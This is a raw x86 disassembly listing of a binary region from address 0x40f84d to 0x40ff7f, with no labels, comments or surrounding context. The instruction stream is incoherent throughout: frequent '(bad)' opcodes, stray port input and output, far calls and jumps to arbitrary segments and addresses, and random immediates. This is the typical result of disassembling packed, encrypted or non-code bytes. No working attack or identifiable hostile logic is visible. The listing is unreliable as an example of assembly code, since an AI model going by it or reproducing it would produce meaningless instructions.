  40f84d:	fbstp  TBYTE PTR [edx-0x72]
  40f850:	mov    ah,0x45
  40f852:	mov    edi,0x80c78ce
  40f857:	mov    ebp,DWORD PTR [ecx+0x50]
  40f85a:	in     al,dx
  40f85b:	rol    eax,cl
  40f85d:	pop    edx
  40f85e:	dec    eax
  40f85f:	out    0x6e,eax
  40f861:	sub    eax,0x8a893d85
  40f866:	sub    BYTE PTR [edx],cl
  40f868:	addr16 sti 
  40f86a:	jmp    0x98e0290a
  40f86f:	and    DWORD PTR [edx-0x3e7aefd4],esp
  40f875:	adc    eax,DWORD PTR [ebx]
  40f877:	sbb    DWORD PTR [ecx+0x70],eax
  40f87a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f87b:	mov    bl,0x5f
  40f87d:	jno    0x40f861
  40f87f:	call   0xfc98:0x693de00f
  40f886:	shr    DWORD PTR [esi],0xe0
  40f889:	jmp    0x3f93:0xb4b1281b
  40f890:	fild   QWORD PTR [esi-0x75]
  40f893:	(bad)  
  40f894:	adc    BYTE PTR [eax+0x76],ah
  40f897:	mov    edi,0xabcc1cd
  40f89c:	dec    ebx
  40f89d:	xchg   ecx,eax
  40f89e:	popf   
  40f89f:	aam    0x77
  40f8a1:	popf   
  40f8a2:	mov    BYTE PTR [ebx+eiz*1],bh
  40f8a5:	mov    ah,0x99
  40f8a7:	dec    edx
  40f8a8:	pop    DWORD PTR [edx+0xaa9cde2]
  40f8ae:	aam    0xda
  40f8b0:	mov    al,0xa1
  40f8b2:	mov    dl,0x57
  40f8b4:	push   cs
  40f8b5:	pop    esp
  40f8b6:	iret   
  40f8b7:	ret    
  40f8b8:	xor    esp,DWORD PTR [eax+eiz*2-0x6cdcea0]
  40f8bf:	(bad)  
  40f8c0:	stc    
  40f8c1:	popf   
  40f8c2:	pop    ebp
  40f8c3:	retf   0x36e2
  40f8c6:	inc    esi
  40f8c7:	test   al,0xbf
  40f8c9:	cmp    cl,BYTE PTR [ebx-0x56]
  40f8cc:	pop    edi
  40f8cd:	ror    DWORD PTR [eax-0x2938d6c4],cl
  40f8d3:	in     eax,dx
  40f8d4:	lea    edx,[ebx-0x36]
  40f8d7:	pop    ebx
  40f8d8:	xchg   BYTE PTR [esp+eax*1],dl
  40f8db:	jno    0x40f8ab
  40f8dd:	aad    0x9c
  40f8df:	xchg   ebx,eax
  40f8e0:	ja     0x40f8a0
  40f8e2:	popf   
  40f8e3:	jb     0x40f885
  40f8e5:	jno    0x40f922
  40f8e7:	lods   al,BYTE PTR ds:[esi]
  40f8e8:	push   esp
  40f8e9:	xchg   edi,eax
  40f8ea:	pop    ebx
  40f8eb:	imul   eax,DWORD PTR [edx+0x41f15f81],0xffffffbd
  40f8f2:	sub    DWORD PTR ds:0xb2417dea,edi
  40f8f8:	mov    esi,0x97501abc
  40f8fd:	cld    
  40f8fe:	leave  
  40f8ff:	pusha  
  40f900:	ror    DWORD PTR [ebp-0x40],0x9e
  40f904:	mov    fs,eax
  40f906:	mov    ds:0xe271e5b0,eax
  40f90b:	daa    
  40f90c:	sbb    eax,0x52d4fda6
  40f911:	lahf   
  40f912:	test   eax,0xa53162f2
  40f917:	aas    
  40f918:	and    ebx,ebx
  40f91a:	mov    bl,0x62
  40f91c:	loop   0x40f8e3
  40f91e:	mov    bh,0x35
  40f920:	pop    es
  40f921:	sub    ch,dl
  40f923:	retf   0x560a
  40f926:	mov    al,ds:0x661d70b9
  40f92b:	fmul   st(2),st
  40f92d:	mov    ch,BYTE PTR [eax-0x64]
  40f930:	adc    eax,0xe3ca7b9
  40f935:	stc    
  40f936:	scas   eax,DWORD PTR es:[edi]
  40f937:	mov    ds:0xd2590ce9,al
  40f93c:	xchg   ecx,eax
  40f93d:	xor    DWORD PTR [ebx+0x5e2167c8],ebx
  40f943:	pop    edx
  40f944:	ror    DWORD PTR [edx-0x73],0xb6
  40f948:	icebp  
  40f949:	cmp    bh,BYTE PTR [esi+0x3ebb237c]
  40f94f:	xlat   BYTE PTR ds:[ebx]
  40f950:	(bad)  
  40f951:	push   esi
  40f952:	ja     0x40f945
  40f954:	push   0xfffffffc
  40f956:	aam    0xff
  40f958:	nop
  40f959:	mov    bh,0xe7
  40f95b:	in     eax,dx
  40f95c:	sbb    ah,BYTE PTR [edi]
  40f95e:	mov    ds:0xecdfd57a,eax
  40f963:	mov    edx,0xb9454731
  40f968:	sbb    DWORD PTR [edi+0x5452c12],ebx
  40f96e:	lea    edi,[eax+0x59e9ef01]
  40f974:	pop    esp
  40f975:	push   esi
  40f976:	clc    
  40f977:	js     0x40f991
  40f979:	xor    eax,0xf870cf2
  40f97e:	and    eax,0x31a2a83c
  40f983:	or     esp,DWORD PTR [edi+0x79]
  40f986:	and    DWORD PTR [eax+0x26],0x5b1bb2ca
  40f98d:	jns    0x40f9f1
  40f98f:	xchg   edx,eax
  40f990:	mov    esp,0x78e734a2
  40f995:	(bad)  
  40f997:	fimul  DWORD PTR [edx-0x719edad4]
  40f99d:	(bad)  
  40f99e:	dec    esi
  40f99f:	stc    
  40f9a0:	or     BYTE PTR [ebx],dh
  40f9a2:	(bad)  
  40f9a3:	fdivr  st,st(0)
  40f9a5:	arpl   WORD PTR [ecx+0x4c],ax
  40f9a8:	imul   ebp,DWORD PTR [esi+ecx*4+0x7032fb2],0xdfc498b7
  40f9b3:	mov    ebx,0x104671c3
  40f9b8:	dec    esp
  40f9b9:	jno    0x40f947
  40f9bb:	out    0x67,eax
  40f9bd:	ret    
  40f9be:	xchg   edi,eax
  40f9bf:	or     DWORD PTR [esp+eiz*8-0x5ff87e79],esi
  40f9c6:	mov    ch,0x91
  40f9c8:	mov    esp,DWORD PTR [esi]
  40f9ca:	nop
  40f9cb:	adc    DWORD PTR [ecx-0x31],edx
  40f9ce:	xchg   ebx,eax
  40f9cf:	dec    esp
  40f9d0:	arpl   WORD PTR [eax-0xbecfee3],cx
  40f9d6:	sahf   
  40f9d7:	(bad)  
  40f9d8:	xchg   ebx,eax
  40f9d9:	dec    esp
  40f9da:	mov    ?,ebp
  40f9dc:	xchg   ecx,eax
  40f9dd:	xchg   ebp,eax
  40f9de:	jns    0x40f96d
  40f9e0:	jp     0x40f9ab
  40f9e2:	pop    ds
  40f9e3:	fcmovbe st,st(2)
  40f9e5:	xchg   edx,eax
  40f9e6:	sub    eax,0x147c60f4
  40f9eb:	cli    
  40f9ec:	jecxz  0x40f9b9
  40f9ee:	clc    
  40f9ef:	mov    dl,0x4b
  40f9f1:	out    0x26,eax
  40f9f3:	loope  0x40fa4a
  40f9f5:	sti    
  40f9f6:	mov    ch,0x89
  40f9f8:	fisttp QWORD PTR [esi-0x59]
  40f9fb:	pop    esp
  40f9fc:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40f9fe:	inc    ebx
  40f9ff:	cli    
  40fa00:	mov    ebx,0x9efe332c
  40fa06:	jle    0x40f9e2
  40fa08:	fimul  DWORD PTR [ebp-0x21]
  40fa0b:	mov    eax,ds:0xaf3cce13
  40fa10:	js     0x40fa64
  40fa12:	fmul   DWORD PTR [ebp-0x2832e791]
  40fa18:	daa    
  40fa19:	out    0xa4,al
  40fa1b:	mov    dh,0xa3
  40fa1d:	pop    ecx
  40fa1e:	dec    esi
  40fa1f:	mov    BYTE PTR [esi-0x60],bh
  40fa22:	popa   
  40fa23:	sbb    dl,BYTE PTR [eax+edx*2+0x4ed53790]
  40fa2a:	fs sbb al,0x4d
  40fa2d:	xchg   ebp,eax
  40fa2e:	addr16 xor al,0x85
  40fa31:	out    dx,al
  40fa32:	pop    ecx
  40fa33:	push   esi
  40fa34:	shr    BYTE PTR [edx+ebx*4-0x23],1
  40fa38:	dec    edx
  40fa39:	in     al,dx
  40fa3a:	fnstcw WORD PTR [edi+0x2e16861f]
  40fa40:	push   ss
  40fa41:	outs   dx,BYTE PTR ds:[esi]
  40fa42:	dec    esi
  40fa43:	(bad)  
  40fa44:	addr16 push esp
  40fa46:	(bad)  
  40fa47:	test   DWORD PTR [ebx],0x7f8884cb
  40fa4d:	neg    BYTE PTR [ecx+0x38]
  40fa50:	mov    ds:0x46962df0,eax
  40fa55:	push   DWORD PTR [ebx-0xc]
  40fa58:	pushf  
  40fa59:	xchg   edx,eax
  40fa5a:	add    DWORD PTR [esi+0x12],esi
  40fa5d:	mov    ecx,0xa8d46336
  40fa62:	cli    
  40fa63:	test   DWORD PTR [esi-0x56],ebx
  40fa66:	je     0x40fa41
  40fa68:	or     DWORD PTR [ebx],0x33bb9d4b
  40fa6e:	stos   BYTE PTR es:[edi],al
  40fa6f:	retf   0x4f6e
  40fa72:	inc    eax
  40fa73:	or     BYTE PTR [edi+eax*2+0x662534af],ah
  40fa7a:	or     al,0x87
  40fa7c:	das    
  40fa7d:	bound  esi,QWORD PTR [ecx-0x6e]
  40fa80:	or     al,0x1c
  40fa82:	cmp    DWORD PTR [ecx+0x0],ebp
  40fa85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa86:	ret    0xf838
  40fa89:	add    DWORD PTR [ebx],edi
  40fa8b:	and    al,al
  40fa8d:	sbb    BYTE PTR [edx+0x2b77ae8b],al
  40fa93:	push   ebx
  40fa94:	sub    cl,bh
  40fa96:	inc    edx
  40fa97:	cmp    cl,BYTE PTR [edi+0x68]
  40fa9a:	por    mm6,QWORD PTR [ebp+0x61]
  40fa9e:	pop    ebx
  40fa9f:	call   0x30f1:0xc8c94451
  40faa6:	aaa    
  40faa7:	mov    bh,0xbb
  40faa9:	sub    eax,0x2a129002
  40faae:	sbb    DWORD PTR [ebx+0x65d797b0],ebp
  40fab4:	test   DWORD PTR fs:[ebp-0x610d07db],ebp
  40fabb:	mov    al,0x73
  40fabd:	ins    DWORD PTR es:[edi],dx
  40fabe:	jns    0x40fae4
  40fac0:	sti    
  40fac1:	xor    eax,0x5d55fd61
  40fac6:	fnstcw WORD PTR [edx-0x74]
  40fac9:	jmp    0x77683e7d
  40face:	popf   
  40facf:	push   cs
  40fad0:	mov    al,BYTE PTR [edx]
  40fad2:	jnp    0x40fb28
  40fad4:	(bad)  
  40fad5:	fcmovne st,st(5)
  40fad7:	mov    ds:0x2cac5b5d,al
  40fadc:	sti    
  40fadd:	adc    BYTE PTR [ebp-0x38],bh
  40fae0:	or     al,0x13
  40fae2:	aas    
  40fae3:	mov    dh,0xb1
  40fae5:	mov    ebp,0xdaf1e613
  40faea:	mov    al,ds:0x5c8243bb
  40faef:	jl     0x40fb24
  40faf1:	jl     0x40fadb
  40faf3:	jnp    0x40fb28
  40faf5:	xchg   esi,eax
  40faf6:	retf   
  40faf7:	aas    
  40faf8:	jg     0x40fb66
  40fafa:	fidivr WORD PTR [eax]
  40fafc:	inc    esi
  40fafd:	pop    ss
  40fafe:	pop    eax
  40faff:	sti    
  40fb00:	mov    cl,0xde
  40fb02:	and    BYTE PTR [edi-0x40],cl
  40fb05:	lods   al,BYTE PTR ds:[esi]
  40fb06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb07:	xor    al,0x51
  40fb09:	inc    esi
  40fb0a:	adc    BYTE PTR [edx-0x56],dl
  40fb0d:	sub    al,al
  40fb0f:	out    0xaf,al
  40fb11:	repnz add ah,BYTE PTR ds:[ebp-0x2]
  40fb16:	jae    0x40fb83
  40fb18:	cwde   
  40fb19:	pushf  
  40fb1a:	inc    eax
  40fb1b:	inc    ecx
  40fb1c:	push   eax
  40fb1d:	es pop ecx
  40fb1f:	scas   al,BYTE PTR es:[edi]
  40fb20:	fwait
  40fb21:	push   ss
  40fb22:	les    eax,FWORD PTR [esi+0x1e]
  40fb25:	movsx  edi,WORD PTR [ebx-0x48]
  40fb29:	repz ja 0x40fad4
  40fb2c:	fadd   DWORD PTR [eax]
  40fb2e:	cmp    DWORD PTR [esp+esi*4-0x8],esp
  40fb32:	addr16 jns 0x40fb10
  40fb35:	push   es
  40fb36:	in     al,dx
  40fb37:	fpatan 
  40fb39:	add    eax,0x6092199f
  40fb3e:	out    0x8f,eax
  40fb40:	ins    BYTE PTR es:[edi],dx
  40fb41:	add    DWORD PTR [esp+ecx*8-0x5a],esp
  40fb45:	popf   
  40fb46:	sahf   
  40fb47:	jbe    0x40fad0
  40fb49:	fidiv  DWORD PTR [ebx-0x34]
  40fb4c:	gs jmp 0x12317982
  40fb52:	jnp    0x40fb6b
  40fb54:	pop    edi
  40fb55:	add    bh,BYTE PTR [edi-0x265140e8]
  40fb5b:	xchg   esi,eax
  40fb5c:	push   esi
  40fb5d:	cmp    eax,0x17e9af62
  40fb62:	adc    edx,esp
  40fb64:	sar    BYTE PTR [eax+0x4199a032],1
  40fb6a:	sub    ebx,DWORD PTR [ecx-0x7c]
  40fb6d:	sbb    dl,0x18
  40fb70:	dec    ebx
  40fb71:	outs   dx,BYTE PTR ds:[esi]
  40fb72:	jmp    0x8a4dc1ac
  40fb77:	push   eax
  40fb78:	je     0x40fb71
  40fb7a:	xor    DWORD PTR [eax+ecx*1+0x58],eax
  40fb7e:	jnp    0x40fbee
  40fb80:	bound  esi,QWORD PTR [ebp+0x4727185f]
  40fb86:	std    
  40fb87:	lods   eax,DWORD PTR ds:[esi]
  40fb88:	push   esp
  40fb89:	shl    BYTE PTR [edx+0x779973a3],cl
  40fb8f:	ins    DWORD PTR es:[edi],dx
  40fb90:	ja     0x40fbc8
  40fb92:	and    DWORD PTR [edx],0x50
  40fb95:	imul   ebp,esi,0xa36e7281
  40fb9b:	stos   DWORD PTR es:[edi],eax
  40fb9c:	dec    ebx
  40fb9d:	dec    edx
  40fb9e:	fild   DWORD PTR [eax+0x2fb582e4]
  40fba4:	push   ecx
  40fba5:	fstp   st(6)
  40fba7:	scas   al,BYTE PTR es:[edi]
  40fba8:	xor    si,WORD PTR [ecx-0x4452e186]
  40fbaf:	dec    esi
  40fbb0:	enter  0x5c80,0xb2
  40fbb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbb5:	aad    0xaf
  40fbb7:	leave  
  40fbb8:	xor    BYTE PTR [ebp+0x1975da2c],dl
  40fbbe:	jecxz  0x40fb5c
  40fbc0:	xor    eax,0x7e91d5c7
  40fbc5:	inc    edi
  40fbc6:	pop    es
  40fbc7:	adc    al,BYTE PTR ds:0xcf7eaa81
  40fbcd:	push   cs
  40fbce:	nop
  40fbcf:	scas   eax,DWORD PTR es:[edi]
  40fbd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbd1:	sub    ecx,DWORD PTR ds:0x818c8853
  40fbd7:	or     ebp,esp
  40fbd9:	jne    0x40fb6a
  40fbdb:	fisttp WORD PTR [esi]
  40fbdd:	mov    WORD PTR [eax*4-0x36a9cf3f],ds
  40fbe4:	push   es
  40fbe5:	xor    DWORD PTR [ebx+edx*1-0xd],edx
  40fbe9:	sub    DWORD PTR [ecx],esp
  40fbeb:	fiadd  DWORD PTR [ebx+0x60]
  40fbef:	mov    ?,WORD PTR [ebx]
  40fbf1:	add    al,0x4a
  40fbf3:	inc    ebp
  40fbf4:	jle    0x40fbd2
  40fbf6:	sub    BYTE PTR [eax],ch
  40fbf8:	fadd   QWORD PTR [ebx+0x5d]
  40fbfb:	or     al,0x3f
  40fbfd:	std    
  40fbfe:	(bad)  
  40fbff:	fnstsw WORD PTR [ebx-0x63]
  40fc02:	push   0x5f
  40fc04:	inc    cl
  40fc06:	inc    eax
  40fc07:	jle    0x40fc2b
  40fc09:	add    al,0xba
  40fc0b:	lock mov eax,ds:0x84366a0f
  40fc11:	fdiv   QWORD PTR fs:[ebx+eax*4]
  40fc15:	mov    eax,ds:0x7360e43e
  40fc1a:	jmp    0xe1db5472
  40fc1f:	mov    gs,WORD PTR [esi]
  40fc21:	and    DWORD PTR [ecx-0x45],eax
  40fc24:	mov    esp,esi
  40fc26:	or     al,0xc6
  40fc28:	cmp    al,0x47
  40fc2a:	xchg   eax,edi
  40fc2c:	adc    al,0xdb
  40fc2e:	inc    ebp
  40fc2f:	push   edx
  40fc30:	sub    eax,0xce98610e
  40fc35:	cld    
  40fc36:	push   edx
  40fc37:	mov    esp,0x5b454fd7
  40fc3c:	cld    
  40fc3d:	or     ebx,0x60
  40fc40:	jb     0x40fc8d
  40fc42:	pushf  
  40fc43:	jns    0x40fc20
  40fc45:	cmp    eax,0xa0876cac
  40fc4a:	jle    0x40fc3a
  40fc4c:	mov    dl,0x52
  40fc4e:	cmp    eax,0x117ac0f9
  40fc53:	ret    0xcfda
  40fc56:	ret    
  40fc57:	add    BYTE PTR [edx+0x7b],dl
  40fc5a:	call   0x5218:0xec4888b5
  40fc61:	add    al,0x84
  40fc63:	mov    esi,DWORD PTR [edi]
  40fc65:	(bad)  [esi-0x15]
  40fc68:	out    0x87,eax
  40fc6a:	push   ebp
  40fc6b:	repz adc eax,0xde412a1a
  40fc71:	push   cs
  40fc72:	adc    BYTE PTR [eax+0x269ebba5],al
  40fc78:	jmp    0x40fcbc
  40fc7a:	adc    al,0x76
  40fc7c:	mov    ecx,0xb0cb79f
  40fc81:	jecxz  0x40fca6
  40fc83:	into   
  40fc84:	add    edi,DWORD PTR [ebp+ebp*4-0x409bd5b1]
  40fc8b:	ret    
  40fc8c:	mov    eax,DWORD PTR [ebx+0x2d]
  40fc8f:	scas   al,BYTE PTR es:[edi]
  40fc90:	lds    eax,FWORD PTR [esi]
  40fc92:	retf   0x1552
  40fc95:	pop    ebx
  40fc96:	push   esi
  40fc97:	jno    0x40fce1
  40fc99:	push   esp
  40fc9a:	xchg   esp,eax
  40fc9b:	in     eax,0x61
  40fc9d:	add    esi,eax
  40fc9f:	xchg   esi,eax
  40fca0:	retf   0x24f7
  40fca3:	sub    al,BYTE PTR [ebp+0x10]
  40fca6:	push   0x9e57523d
  40fcab:	rcl    DWORD PTR [ecx-0x776a4dfb],cl
  40fcb1:	adc    al,dl
  40fcb3:	xchg   BYTE PTR [edx+0x35],al
  40fcb6:	xor    ebx,DWORD PTR [edi-0x27]
  40fcb9:	cwde   
  40fcba:	aad    0x36
  40fcbc:	push   esp
  40fcbd:	ds out dx,al
  40fcbf:	or     BYTE PTR [ebp+0x22],dl
  40fcc2:	(bad)  
  40fcc3:	retf   0x36ea
  40fcc6:	in     eax,0x52
  40fcc8:	cld    
  40fcc9:	sahf   
  40fcca:	outs   dx,BYTE PTR ds:[esi]
  40fccb:	cli    
  40fccc:	jae    0x40fd41
  40fcce:	shl    DWORD PTR [ecx],0x83
  40fcd1:	fwait
  40fcd2:	cmp    ebx,DWORD PTR [edx-0x73]
  40fcd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcd6:	cdq    
  40fcd7:	rol    BYTE PTR [edx],1
  40fcd9:	sti    
  40fcda:	jo     0x40fd01
  40fcdc:	cwde   
  40fcdd:	push   esp
  40fcde:	xor    eax,esp
  40fce0:	sbb    ecx,DWORD PTR [edx]
  40fce2:	fcomip st,st(7)
  40fce4:	xor    dh,0x7d
  40fce7:	mov    esp,0x72438155
  40fcec:	jge    0x40fd6c
  40fcee:	les    ebp,FWORD PTR [edi+0x59]
  40fcf1:	call   0x925b:0x14ac3cd8
  40fcf8:	outs   dx,DWORD PTR ds:[esi]
  40fcf9:	inc    edi
  40fcfa:	xchg   edi,eax
  40fcfb:	cld    
  40fcfc:	jmp    0x68db2edd
  40fd01:	fbstp  TBYTE PTR ds:0xbed68218
  40fd07:	shl    BYTE PTR [esi+0x7d],cl
  40fd0a:	iret   
  40fd0b:	mov    al,0xce
  40fd0d:	int3   
  40fd0e:	shl    BYTE PTR [edi],1
  40fd10:	fstp   QWORD PTR [ecx-0x13]
  40fd13:	sub    bh,BYTE PTR [bp+si-0x21]
  40fd17:	jo     0x40fd43
  40fd19:	cmc    
  40fd1a:	fs test al,0xbf
  40fd1d:	icebp  
  40fd1e:	push   edi
  40fd1f:	cmp    esp,eax
  40fd21:	cs lock pop eax
  40fd24:	ror    ch,0x43
  40fd27:	add    al,0x97
  40fd29:	and    eax,0x707fbdbc
  40fd2e:	stos   DWORD PTR es:[edi],eax
  40fd2f:	sub    BYTE PTR [esi],bh
  40fd31:	add    al,0x15
  40fd33:	cdq    
  40fd34:	or     DWORD PTR [ecx],0xdd9d22e9
  40fd3a:	arpl   ax,cx
  40fd3c:	cli    
  40fd3d:	sub    eax,0x45d703c9
  40fd42:	pop    ds
  40fd43:	push   ebp
  40fd44:	popf   
  40fd45:	mov    edi,0x3a506157
  40fd4a:	sbb    BYTE PTR [edx],0x89
  40fd4d:	xchg   DWORD PTR [edx+ecx*4],ecx
  40fd50:	xchg   esp,eax
  40fd51:	sub    DWORD PTR [ecx-0x6d105761],ebp
  40fd57:	adc    eax,0x6c752001
  40fd5c:	cs gs jmp 0x40fdaf
  40fd60:	pop    es
  40fd61:	mov    ecx,edx
  40fd63:	fsubrp st(7),st
  40fd65:	inc    eax
  40fd66:	inc    eax
  40fd67:	ds stos BYTE PTR es:[edi],al
  40fd69:	sbb    ecx,edx
  40fd6b:	loop   0x40fdc9
  40fd6d:	clc    
  40fd6e:	fidivr DWORD PTR [ecx]
  40fd70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd71:	mov    bl,0xd6
  40fd73:	inc    esp
  40fd74:	dec    ebp
  40fd75:	sub    bl,BYTE PTR [esi+edx*4]
  40fd78:	stc    
  40fd79:	(bad)  
  40fd7b:	add    edx,esp
  40fd7d:	ins    DWORD PTR es:[edi],dx
  40fd7e:	dec    ebx
  40fd7f:	fisttp QWORD PTR [esi+0x74186146]
  40fd85:	push   edi
  40fd86:	rcr    bh,0x28
  40fd89:	or     al,0xb9
  40fd8b:	push   0x24
  40fd8d:	mov    eax,0x30ece832
  40fd92:	xor    cl,dl
  40fd94:	inc    ecx
  40fd95:	ror    DWORD PTR [esi-0x686358e3],cl
  40fd9b:	ja     0x40fdfd
  40fd9d:	shl    DWORD PTR [eax],cl
  40fd9f:	loopne 0x40fd81
  40fda1:	das    
  40fda2:	out    dx,al
  40fda3:	dec    ecx
  40fda4:	scas   eax,DWORD PTR es:[edi]
  40fda5:	fisub  WORD PTR [eax+0x71]
  40fda8:	pop    eax
  40fda9:	xor    ch,BYTE PTR [edx-0x1e]
  40fdac:	dec    BYTE PTR [ebx+eiz*4-0x2]
  40fdb0:	lock sbb cl,BYTE PTR [edx-0x2c76f58d]
  40fdb7:	and    al,0x5b
  40fdb9:	popf   
  40fdba:	repz std 
  40fdbc:	push   es
  40fdbd:	loopne 0x40fdd1
  40fdbf:	xchg   esi,eax
  40fdc0:	fimul  WORD PTR ss:[ecx]
  40fdc3:	mov    esp,0xf5d8f2b1
  40fdc8:	fidiv  DWORD PTR [esi-0x22]
  40fdcb:	mov    dl,0xbf
  40fdcd:	lock adc DWORD PTR [esi+0x33],0xffffffef
  40fdd2:	or     eax,DWORD PTR [eax+0x765cd5cf]
  40fdd8:	inc    ebx
  40fdd9:	ja     0x40fd9c
  40fddb:	cld    
  40fddc:	test   dh,0xe0
  40fddf:	pusha  
  40fde0:	pop    esi
  40fde1:	iret   
  40fde2:	xchg   BYTE PTR [ebp-0x3f90107c],al
  40fde8:	xor    edx,DWORD PTR [ebp-0x40]
  40fdeb:	(bad)  [ecx+0x12]
  40fdee:	or     DWORD PTR [edx],ebp
  40fdf0:	cmp    al,0x34
  40fdf2:	(bad)  
  40fdf3:	loop   0x40fdfc
  40fdf5:	mul    BYTE PTR [ecx]
  40fdf7:	jmp    0x7f801b25
  40fdfc:	add    esp,eax
  40fdfe:	mov    esi,0x727a1362
  40fe03:	jne    0x40fde6
  40fe05:	sti    
  40fe06:	or     eax,0xf76d8977
  40fe0b:	adc    DWORD PTR [esi+0x39],ecx
  40fe0e:	loopne 0x40fd9a
  40fe10:	test   BYTE PTR [ecx],bh
  40fe12:	dec    ebp
  40fe13:	sub    eax,DWORD PTR [edi]
  40fe15:	cmp    eax,0xc2df7bc6
  40fe1a:	aad    0xc0
  40fe1c:	iret   
  40fe1d:	add    ecx,DWORD PTR [ebx-0x12]
  40fe20:	add    bh,bl
  40fe22:	add    ch,BYTE PTR [edx]
  40fe24:	jns    0x40fe9f
  40fe26:	xchg   DWORD PTR [esi+0x68],esp
  40fe29:	out    dx,al
  40fe2a:	push   es
  40fe2b:	loope  0x40fe3e
  40fe2d:	fild   WORD PTR [ecx]
  40fe2f:	test   eax,0x5a053310
  40fe34:	out    dx,eax
  40fe35:	jmp    0x8d01:0x952f420
  40fe3c:	jne    0x40feb6
  40fe3e:	xor    DWORD PTR [esp+esi*8+0x25e64772],esi
  40fe45:	repnz mov esp,0xb2fbf357
  40fe4b:	cmp    bl,bl
  40fe4d:	push   ecx
  40fe4e:	repnz push es
  40fe50:	mov    edi,0xcd79b3fc
  40fe55:	(bad)  
  40fe57:	xor    al,0xd6
  40fe59:	push   cs
  40fe5a:	xor    DWORD PTR [edx],edi
  40fe5c:	or     edi,DWORD PTR [ecx]
  40fe5e:	rol    BYTE PTR [edx-0x1971df77],cl
  40fe64:	inc    edx
  40fe65:	mov    ebp,0xf1ba16f6
  40fe6a:	shl    DWORD PTR [esi+0x1e305619],1
  40fe70:	xlat   BYTE PTR ds:[ebx]
  40fe71:	les    esp,FWORD PTR [edx]
  40fe73:	or     ecx,edi
  40fe75:	scas   eax,DWORD PTR es:[edi]
  40fe76:	jnp    0x40feeb
  40fe78:	bnd jmp 0xa82f8503
  40fe7e:	add    edi,ecx
  40fe80:	sbb    al,0x9d
  40fe82:	in     eax,dx
  40fe83:	cmp    bh,bh
  40fe85:	xchg   ecx,eax
  40fe86:	xor    DWORD PTR ds:0xbbb4ce41,esp
  40fe8c:	push   esi
  40fe8d:	ror    BYTE PTR [ecx-0x23],1
  40fe90:	pop    ebp
  40fe91:	and    eax,DWORD PTR [esi-0x50282abc]
  40fe97:	int    0xe7
  40fe99:	push   esp
  40fe9a:	add    BYTE PTR [edx-0xb],dl
  40fe9d:	fldcw  WORD PTR [edi-0xa26b221]
  40fea3:	cdq    
  40fea4:	loopne 0x40fe7e
  40fea6:	div    cl
  40fea8:	addr16 into 
  40feaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40feab:	sbb    BYTE PTR [esi+0x12903e57],al
  40feb1:	xchg   ecx,eax
  40feb2:	ffree  st(2)
  40feb4:	(bad)  
  40feb5:	pop    ss
  40feb6:	push   ecx
  40feb7:	stc    
  40feb8:	test   al,0xbe
  40feba:	push   cs
  40febb:	jg     0x40fe49
  40febd:	icebp  
  40febe:	sub    eax,0x59c95d37
  40fec3:	bound  ebp,QWORD PTR [ebx+0x57]
  40fec6:	jmp    0x40fe72
  40fec8:	clc    
  40fec9:	ds adc al,0xf4
  40fecc:	out    0xd1,al
  40fece:	(bad)  
  40fecf:	cmp    ebp,DWORD PTR [edi-0x41]
  40fed2:	loope  0x40ff1d
  40fed4:	int    0x6e
  40fed6:	and    BYTE PTR ds:0xf6291ba0,bl
  40fedc:	jno    0x40ff0b
  40fede:	int    0x4a
  40fee0:	rcr    DWORD PTR [edx-0xbfc5a09],0x81
  40fee7:	in     eax,dx
  40fee8:	daa    
  40fee9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40feea:	in     al,0xf1
  40feec:	cmp    ebp,DWORD PTR [ebx+0x5b65337e]
  40fef2:	fstp   QWORD PTR [ebx]
  40fef4:	stos   BYTE PTR es:[edi],al
  40fef5:	jnp    0x40fec6
  40fef7:	bt     DWORD PTR [ecx-0x55289ee2],eax
  40fefe:	sub    al,ch
  40ff00:	add    DWORD PTR [ebx+ebp*8],0xbe4ef120
  40ff07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff09:	clc    
  40ff0a:	outs   dx,DWORD PTR ds:[esi]
  40ff0b:	jecxz  0x40ff33
  40ff0d:	and    ebp,edx
  40ff0f:	stos   BYTE PTR es:[edi],al
  40ff10:	cmp    BYTE PTR [esi+edi*1-0x65d76766],0xe9
  40ff18:	int3   
  40ff19:	pop    es
  40ff1a:	mov    dl,0x43
  40ff1c:	test   BYTE PTR fs:[eax+0x395ee567],0x89
  40ff24:	add    bl,dl
  40ff26:	repz (bad) 
  40ff28:	sub    ebx,DWORD PTR [ebx]
  40ff2a:	mov    bl,0xf0
  40ff2c:	je     0x40feed
  40ff2e:	sub    DWORD PTR [edx],edx
  40ff30:	sub    esp,DWORD PTR [ecx+esi*8-0x62]
  40ff34:	das    
  40ff35:	sbb    ah,dl
  40ff37:	jl     0x40ff65
  40ff39:	sbb    dl,al
  40ff3b:	mov    al,0x37
  40ff3d:	daa    
  40ff3e:	mov    al,0xb3
  40ff40:	cli    
  40ff41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff42:	or     DWORD PTR [edi],0xd534b6e1
  40ff48:	jae    0x40ff72
  40ff4a:	pop    ds
  40ff4b:	jmp    0xe2d4dbe3
  40ff50:	bound  ebx,QWORD PTR [ebp+0x4402e49]
  40ff56:	cmp    ch,BYTE PTR [esi-0x10]
  40ff59:	mov    WORD PTR ds:0xd5b560ee,ss
  40ff5f:	xchg   ecx,eax
  40ff60:	sbb    al,BYTE PTR [ecx-0x5ad33dd]
  40ff66:	push   ds
  40ff67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff68:	scas   al,BYTE PTR es:[edi]
  40ff69:	and    al,0x5a
  40ff6b:	or     ebp,DWORD PTR [edx]
  40ff6d:	mov    dh,0xe0
  40ff6f:	adc    al,0x7d
  40ff71:	mov    ebp,0xaa9f9eb8
  40ff76:	in     al,dx
  40ff77:	cmp    dl,BYTE PTR [ecx+0x6e8c5007]
  40ff7d:	test   al,0xb7
  40ff7f:	adc    esi,esp
